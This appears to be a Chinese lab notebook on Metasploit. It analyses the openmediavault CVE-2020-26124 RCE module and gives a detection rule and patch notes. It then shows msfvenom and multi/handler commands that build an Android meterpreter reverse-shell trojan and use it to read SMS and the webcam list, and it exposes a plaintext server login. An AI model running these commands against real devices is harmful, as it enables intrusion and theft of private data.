## metasploit了解

更新至2020/11/23含有4125个exploits 1125个auxiliary 352个post 592个payloads 45个encoders 10 nops:10、 evasion:7

![](assets/image506.jpg)

例子：CVE-2020-26124

造成漏洞原因：

4.1.36之前的openmediavault和5.5.12之前的5.x允许通过rpc.php的sortfield POST参数进行经过身份验证的PHP代码注入攻击，因为config / databasebackend.inc中未使用json\_encode\_safe。成功利用漏洞后，可以在根操作系统上以root用户身份执行任意命令。

![](assets/image508.jpg)

1.     show options &set

![](assets/image510.jpg)

2.     分析openmediacault\_rpc\_rce.rb文件

大概流程：1.check a.login()  post请求rpc.php文件

                 b.get\_target() post请求version信息

                 b.execute\_command() post请求数据中携带.exec(命令)

          2.exploit a.execute\_cmdstager

3.使用，抓包分析，书写规则

![](assets/image512.jpg)

执行成功。

![](assets/image514.jpg)

规则中可以检测：

"sortfield":"'.exec(\\"

4.查看补丁信息

添加了json\_encode\_safe()函数

![](assets/image516.jpg)

### 3.1 metasploit\_shellcode

1.环境

121服务器上已搭建metasploit环境(用户名密码：zky/gujie0513)

![](assets/image517.png)

环境所在目录：/home/zky/git/metasploit-framework-master

![](assets/image518.png)

生成shellcode

### 3.2利用metasploit生成安卓木马

1.生成木马

msfvenom -p android/meterpreter/reverse\_tcp lhost=192.168.159.224 lport=55555 R > zky.apk

![](assets/image520.jpg)

使用逍遥模拟器打开

![](assets/image522.jpg)

注意安装逍遥模拟器需要打开虚拟机虚拟化vt设置

![](assets/image524.jpg)

打开metasploit监听端口，运行MainActivity

![](assets/image526.jpg)

发送一个真正的apk到安卓模拟器，然后成功启动一个会话，利用这个会话获取基本信息以及短信等信息

![](assets/image528.jpg)

使用jadx-gui分析zky.apk文件，可以看到该应用具有一些敏感权限

![](assets/image530.jpg)

抓取流量分析：

发送的apk携带链接信息

![](assets/image532.jpg)

use exploit/multi/handler

set payload android/meterpreter/reverse\_tcp

set lhost 192.168.159.224

set lport 55555

exploit

webcam\_list

调试过程中涉及的脚本，之后如果遇到可以进行参考

![](assets/image534.jpg)
